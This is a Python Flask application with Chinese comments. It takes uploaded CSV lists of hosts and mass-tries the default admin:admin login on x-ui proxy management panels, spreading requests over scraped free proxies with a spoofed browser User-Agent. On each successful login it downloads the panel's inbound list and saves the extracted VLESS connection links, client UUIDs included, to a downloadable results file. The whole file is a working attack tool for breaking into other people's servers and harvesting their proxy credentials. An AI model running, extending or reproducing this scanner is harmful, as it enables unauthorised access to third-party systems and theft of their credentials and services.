# app.py
import os
import uuid
import json
import re
import csv
import random
import pandas as pd  # 新增
from flask import Flask, render_template, request, send_from_directory, jsonify
from werkzeug.utils import secure_filename
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse
import requests
from bs4 import BeautifulSoup
from threading import Lock
import chardet
import threading

app = Flask(__name__)

# 配置
UPLOAD_FOLDER = 'uploads'
RESULT_FOLDER = 'results'
ALLOWED_EXTENSIONS = {'csv'}
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.config['RESULT_FOLDER'] = RESULT_FOLDER
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # 16MB 上传限制

# 确保上传和结果文件夹存在
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(RESULT_FOLDER, exist_ok=True)

# 全局锁和计数器
write_lock = Lock()
counter_lock = Lock()
counter = 0

# 弱密码列表
# USERNAME_LIST = ['admin', 'root', 'test']
# PASSWORD_LIST = ['123456', 'admin', 'test']

# 请求头信息
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
}

# 重试配置
RETRY_TIMES = 3
RETRY_BACKOFF_FACTOR = 0.3

# 代理池
proxies_list = []

# 获取代理池
def fetch_proxies():
    url = 'https://free-proxy-list.net/'
    try:
        response = requests.get(url, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        table = soup.find('table')
        rows = table.find_all('tr')

        proxies = []

        for row in rows:
            cols = row.find_all('td')
            if cols:
                ip_address = cols[0].text.strip()
                port = cols[1].text.strip()
                https = cols[6].text.strip()

                protocol = 'https' if https.lower() == 'yes' else 'http'
                proxies.append((protocol, ip_address, int(port)))

        # 检查代理的可用性
        valid_proxies = []
        for proxy in proxies:
            protocol, ip, port = proxy
            try:
                test_response = requests.get('https://httpbin.org/ip', proxies={protocol: f"{protocol}://{ip}:{port}"}, timeout=5)
                if test_response.status_code == 200:
                    valid_proxies.append(proxy)
            except:
                continue

        global proxies_list
        proxies_list = valid_proxies
        print(f"Valid proxies fetched: {len(proxies_list)}")
    except Exception as e:
        print(f"Error fetching proxies: {e}")

# 提取 v2ray 链接
def extract_v2ray_links(session, link):
    vless_links = []
    try:
        list_url = f"{link.rstrip('/')}/xui/inbound/list"
        response = session.post(list_url, headers=HEADERS, verify=False, timeout=10)
        data_group = response.json().get('obj', [])

        for item in data_group:
            protocol = item.get('protocol', '')
            if protocol.lower() != "vless":
                continue
            port = str(item.get('port', ''))
            remark = str(item.get('remark', ''))

            setting = json.loads(item.get('settings', '{}'))
            streamSettings = json.loads(item.get('streamSettings', '{}'))
            v2id = str(setting.get('clients', [{}])[0].get('id', ''))
            network = streamSettings.get('network', '')
            security = streamSettings.get('security', '')

            typee = re.findall(r'type":\s*"(.*?)"', json.dumps(streamSettings))
            host = re.findall(r'Host":\s*"(.*?)"', json.dumps(streamSettings))
            path = re.findall(r'path":\s*"(.*?)"', json.dumps(streamSettings))

            typee = typee[0] if typee else "none"
            host = host[0] if host else ""
            path = path[0] if path else ""
            add = urlparse(link).hostname

            if security.lower() == "tls":
                add_match = re.findall(r'serverName":\s*"(.*?)"', json.dumps(streamSettings))
                add = add_match[0] if add_match else urlparse(link).hostname

            flow = str(setting.get('clients', [{}])[0].get('flow', ''))
            vless = f"vless://{v2id}@{add}:{port}?type={network}&security={security}&flow={flow}&host={host}&path={path}&type={typee}#{remark}"
            vless_links.append(vless)

        print(f"Extracted {len(vless_links)} VLESS links from {link}")
    except Exception as e:
        print(f"Error extracting VLESS links from {link}: {e}")

    return vless_links

# 检测文件编码
def detect_file_encoding(file_path):
    with open(file_path, 'rb') as f:
        raw_data = f.read()
        result = chardet.detect(raw_data)
        return result['encoding']

# 验证URL格式
def is_valid_url(url):
    try:
        parsed = urlparse(url)
        return bool(parsed.scheme) and bool(parsed.netloc)
    except:
        return False

# 读取CSV文件并提取链接
def read_links_from_csv(file_path):
    encoding = detect_file_encoding(file_path)
    links = []
    with open(file_path, newline='', encoding=encoding) as csvfile:
        reader = csv.reader(csvfile)
        next(reader, None)  # 无条件跳过第一行（标题行）
        for row_number, row in enumerate(reader, start=2):
            if not row:
                continue
            link = row[0].strip()
            if not link:
                continue
            # 确保链接包含协议
            if not re.match(r'^https?://', link, re.IGNORECASE):
                link = 'http://' + link
            # 验证URL格式
            if is_valid_url(link):
                links.append(link)
            else:
                print(f"Invalid URL at row {row_number}: {link}")
    return links

# 检测单个链接的弱密码
def check_weak_password(link, csv_writer, total_links, proxies, use_proxies):
    global counter
    session = requests.Session()
    retries = requests.adapters.Retry(
        total=RETRY_TIMES,
        backoff_factor=RETRY_BACKOFF_FACTOR,
        status_forcelist=[500, 502, 503, 504]
    )
    adapter = requests.adapters.HTTPAdapter(max_retries=retries)
    session.mount('http://', adapter)
    session.mount('https://', adapter)

    if use_proxies and proxies:
        try:
            proxy = random.choice(proxies)
            protocol, ip, port = proxy
            session.proxies = {protocol: f"{protocol}://{ip}:{port}"}
        except Exception as e:
            print(f"Failed to set proxy for {link}: {e}")

    # 修改登录 URL，添加 /xui/login 路径
    login_url = f"{link.rstrip('/')}/login"
    weak_password_found = False

    username = 'admin'
    password = 'admin'
    data = {
        "username": username,
        "password": password
    }

    try:
        response = session.post(login_url, headers=HEADERS, data=data, verify=False, timeout=10)
        if response.status_code == 200:
            # 打印完整的响应内容以供调试
            print(f"Response from {login_url}: {response.text}")

            if '"success":true' in response.text.lower():
                print(f"Weak password detected: {login_url} with {username}:{password}")
                weak_password_found = True
                vless_links = extract_v2ray_links(session, link)
                if vless_links:
                    with write_lock:
                        for vless in vless_links:
                            csv_writer.writerow({'link': link, 'vless': vless})
                            print(f"VLESS Link: {vless}")
                else:
                    print(f"No VLESS links found for {link}")
            else:
                print(f"Failed to authenticate {login_url}: {response.text}")
        else:
            print(f"Failed to access {login_url}: Status code {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Error accessing {login_url} with {username}:{password} - {e}")

    with counter_lock:
        counter += 1
        print(f"Thread {threading.current_thread().name} processed {counter}/{total_links} links")

# 主函数
def main(file_path, result_file_path, use_proxies):
    try:
        # 使用 pandas 预处理 CSV 文件
        df = pd.read_csv(file_path)
        # 确保 'host' 和 'port' 列存在
        if 'host' in df.columns and 'port' in df.columns:
            # 对每行进行检查，如果'host'中已包含':',则不修改；否则添加':port'
            df['host'] = df.apply(lambda row: row['host'] if ':' in row['host'] else f"{row['host']}:{row['port']}", axis=1)
            # 选择只保留 'host' 列
            df = df[['host']]
            # 定义修改后的文件路径
            modified_file_path = os.path.join(app.config['UPLOAD_FOLDER'], f"modified_{os.path.basename(file_path)}")
            # 保存新的CSV文件
            df.to_csv(modified_file_path, index=False)
            print(f"Modified CSV saved to {modified_file_path}")
        else:
            print("Error: CSV file does not contain 'host' and/or 'port' columns.")
            return

        # 读取链接
        links = read_links_from_csv(modified_file_path)
    except Exception as e:
        print(f"Error processing CSV file with pandas: {e}")
        return

    if not links:
        print("No links found in the CSV file.")
        return

    total_links = len(links)
    proxies = proxies_list if use_proxies else []
    global counter
    counter = 0

    try:
        with open(result_file_path, 'w', newline='', encoding='utf-8', buffering=1) as csvfile:
            fieldnames = ['link', 'vless']
            csv_writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
            csv_writer.writeheader()

            with ThreadPoolExecutor(max_workers=10) as executor:
                executor.map(lambda link: check_weak_password(link, csv_writer, total_links, proxies, use_proxies), links)
    except Exception as e:
        print(f"Error writing to result CSV file: {e}")

# 路由：主页
@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        # 检查是否有文件上传
        if 'hosts_files[]' not in request.files:
            return render_template('index.html', error="没有文件被上传。")

        files = request.files.getlist('hosts_files[]')
        if not files:
            return render_template('index.html', error="没有选择文件。")

        tokens = []
        for file in files:
            if file and allowed_file(file.filename):
                filename = secure_filename(file.filename)
                unique_filename = f"{uuid.uuid4().hex}_{filename}"
                file_path = os.path.join(app.config['UPLOAD_FOLDER'], unique_filename)
                file.save(file_path)

                # 生成唯一的token
                token = uuid.uuid4().hex
                tokens.append(token)

                # 定义结果文件路径
                result_file = os.path.join(app.config['RESULT_FOLDER'], f"{token}_weak_password_links.csv")

                # 获取是否使用代理
                use_proxies = request.form.get('use_proxies') == '1'

                # 使用线程池异步处理文件
                threading.Thread(target=main, args=(file_path, result_file, use_proxies), daemon=True).start()
            else:
                return render_template('index.html', error="不允许的文件类型。仅支持CSV文件。")

        return render_template('index.html', tokens=tokens)

    return render_template('index.html')

# 路由：下载结果文件
@app.route('/download/<token>/<file_type>', methods=['GET'])
def download_file(token, file_type):
    if file_type not in ['ip_risk', 'nodes']:
        return "Invalid file type.", 400

    # 根据file_type选择文件
    if file_type == 'ip_risk':
        filename = f"{token}_weak_password_links.csv"
    elif file_type == 'nodes':
        filename = f"{token}_nodes.txt"  # 假设有对应的nodes文件
    else:
        return "Invalid file type.", 400

    result_path = os.path.join(app.config['RESULT_FOLDER'], filename)
    if os.path.exists(result_path):
        return send_from_directory(app.config['RESULT_FOLDER'], filename, as_attachment=True)
    else:
        return "File not found or processing not completed.", 404

# 路由：检查处理状态
@app.route('/check_python_status/<token>', methods=['GET'])
def check_status(token):
    result_file = os.path.join(app.config['RESULT_FOLDER'], f"{token}_weak_password_links.csv")
    if os.path.exists(result_file):
        return jsonify({'status': 'finished'})
    else:
        return jsonify({'status': 'processing'})

# 辅助函数：检查文件扩展名
def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

if __name__ == "__main__":
    # 初始化代理池
    fetch_proxies()
    app.run(debug=True)
